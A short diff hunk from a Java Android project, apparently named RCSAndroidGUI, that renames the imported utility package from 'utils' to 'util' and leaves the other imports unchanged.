@@ -22,11 +22,11 @@ import com.ht.RCSAndroidGUI.evidence.EvidenceType;
 import com.ht.RCSAndroidGUI.file.AutoFile;
 import com.ht.RCSAndroidGUI.file.Directory;
 import com.ht.RCSAndroidGUI.file.Path;
-import com.ht.RCSAndroidGUI.utils.Check;
-import com.ht.RCSAndroidGUI.utils.DataBuffer;
-import com.ht.RCSAndroidGUI.utils.DateTime;
-import com.ht.RCSAndroidGUI.utils.Utils;
-import com.ht.RCSAndroidGUI.utils.WChar;
+import com.ht.RCSAndroidGUI.util.Check;
+import com.ht.RCSAndroidGUI.util.DataBuffer;
+import com.ht.RCSAndroidGUI.util.DateTime;
+import com.ht.RCSAndroidGUI.util.Utils;
+import com.ht.RCSAndroidGUI.util.WChar;
 
 // TODO: Auto-generated Javadoc
 /**
